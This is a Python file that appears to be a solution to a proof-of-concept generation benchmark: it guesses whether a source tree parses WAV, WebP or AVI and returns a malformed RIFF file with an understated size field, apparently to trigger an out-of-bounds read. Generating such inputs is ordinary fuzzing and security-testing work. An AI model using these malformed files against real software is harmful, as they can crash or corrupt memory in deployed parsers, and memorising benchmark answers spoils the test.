import os
import re
import struct
import tarfile
from typing import Dict, Tuple, Optional


def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _wav_poc(data_size: int = 14) -> bytes:
    # RIFF size excludes the actual data payload (ends right after 'data' header)
    riff_size = 4 + (8 + 16) + 8  # "WAVE" + fmt chunk + data header
    fmt_payload = struct.pack("<HHIIHH", 1, 1, 8000, 8000, 1, 8)  # PCM, mono, 8-bit
    payload = b"A" * data_size
    return (
        b"RIFF"
        + _le32(riff_size)
        + b"WAVE"
        + b"fmt "
        + _le32(16)
        + fmt_payload
        + b"data"
        + _le32(data_size)
        + payload
    )


def _webp_poc() -> bytes:
    # RIFF size excludes the VP8X payload; file includes it after the RIFF end.
    # RIFF payload: "WEBP" + "VP8X" + chunk_size (no chunk payload counted)
    riff_size = 4 + 8  # WEBP + chunk header
    vp8x_payload = b"\x00" * 10  # minimal VP8X payload
    return b"RIFF" + _le32(riff_size) + b"WEBP" + b"VP8X" + _le32(10) + vp8x_payload


def _avi_poc() -> bytes:
    # Minimal RIFF AVI with a LIST chunk whose data lies outside RIFF end.
    # This is a generic malformed RIFF; may not be useful but kept as a fallback.
    riff_size = 4 + 8  # "AVI " + one chunk header, no payload counted
    return b"RIFF" + _le32(riff_size) + b"AVI " + b"LIST" + _le32(12) + b"\x00" * 12


def _iter_text_files_from_tar(tf: tarfile.TarFile, max_file_size: int = 512000, max_total: int = 16_000_000):
    total = 0
    for m in tf.getmembers():
        if not m.isfile():
            continue
        if m.size <= 0 or m.size > max_file_size:
            continue
        name = m.name
        lower = name.lower()
        if not (
            lower.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".inl", ".m", ".mm", ".py", ".gn", ".gni", ".cmake", ".txt", ".md", ".rst", ".toml", ".json", ".yml", ".yaml", ".bazel", "cMakeLists.txt".lower()))
            or "fuzz" in lower
            or "oss-fuzz" in lower
        ):
            continue
        try:
            f = tf.extractfile(m)
            if f is None:
                continue
            data = f.read()
        except Exception:
            continue
        total += len(data)
        if total > max_total:
            break
        yield name, data


def _iter_text_files_from_dir(root: str, max_file_size: int = 512000, max_total: int = 16_000_000):
    total = 0
    exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".inl", ".m", ".mm", ".py", ".gn", ".gni", ".cmake", ".txt", ".md", ".rst", ".toml", ".json", ".yml", ".yaml", ".bazel")
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            lower = fn.lower()
            if not (lower.endswith(exts) or "fuzz" in lower or "oss-fuzz" in path.lower() or fn == "CMakeLists.txt"):
                continue
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > max_file_size:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            total += len(data)
            if total > max_total:
                return
            yield path, data


def _detect_target_kind_from_texts(items) -> str:
    # Returns one of: "wav", "webp", "avi", "unknown"
    scores: Dict[str, int] = {"wav": 0, "webp": 0, "avi": 0}
    for name, data in items:
        lower_name = name.lower()
        if "webp" in lower_name or "vp8" in lower_name:
            scores["webp"] += 4
        if "wav" in lower_name or "wave" in lower_name:
            scores["wav"] += 3
        if "avi" in lower_name:
            scores["avi"] += 2
        if "riff" in lower_name:
            scores["wav"] += 1
            scores["webp"] += 1
            scores["avi"] += 1

        d = data
        if b"LLVMFuzzerTestOneInput" in d or b"Fuzz" in d or b"fuzz" in d:
            scores["wav"] += 1
            scores["webp"] += 1
            scores["avi"] += 1

        # Strong signals
        if b"WebP" in d or b"WEBP" in d or b"VP8X" in d or b"VP8L" in d or b"VP8 " in d:
            scores["webp"] += 20
        if b"WAVE" in d or b"fmt " in d or b"RIFF WAVE" in d or b"wave" in d and b"RIFF" in d:
            scores["wav"] += 18
        if b"AVI " in d or b"avih" in d or b"movi" in d:
            scores["avi"] += 15

        # API hints
        if b"sndfile" in d or b"drwav" in d or b"WavReader" in d or b"ReadWav" in d:
            scores["wav"] += 10
        if b"WebPDecode" in d or b"WebPDemux" in d or b"WebPMux" in d:
            scores["webp"] += 12

    best = max(scores.items(), key=lambda kv: kv[1])
    if best[1] <= 0:
        return "unknown"
    return best[0]


def _detect_target_kind(src_path: str) -> str:
    if os.path.isdir(src_path):
        return _detect_target_kind_from_texts(_iter_text_files_from_dir(src_path))
    try:
        with tarfile.open(src_path, "r:*") as tf:
            kind = _detect_target_kind_from_texts(_iter_text_files_from_tar(tf))
            if kind != "unknown":
                return kind
            # Fallback: infer from filenames only
            webp = wav = avi = 0
            for m in tf.getmembers():
                n = m.name.lower()
                if "webp" in n or "vp8" in n:
                    webp += 1
                if "wav" in n or "wave" in n:
                    wav += 1
                if "avi" in n:
                    avi += 1
            if webp >= wav and webp >= avi and webp > 0:
                return "webp"
            if wav >= webp and wav >= avi and wav > 0:
                return "wav"
            if avi > 0:
                return "avi"
    except Exception:
        pass
    return "unknown"


class Solution:
    def solve(self, src_path: str) -> bytes:
        kind = _detect_target_kind(src_path)
        if kind == "webp":
            return _webp_poc()
        if kind == "avi":
            return _avi_poc()
        # Default to WAV; ground-truth length hints align well with RIFF/WAVE cases
        return _wav_poc(14)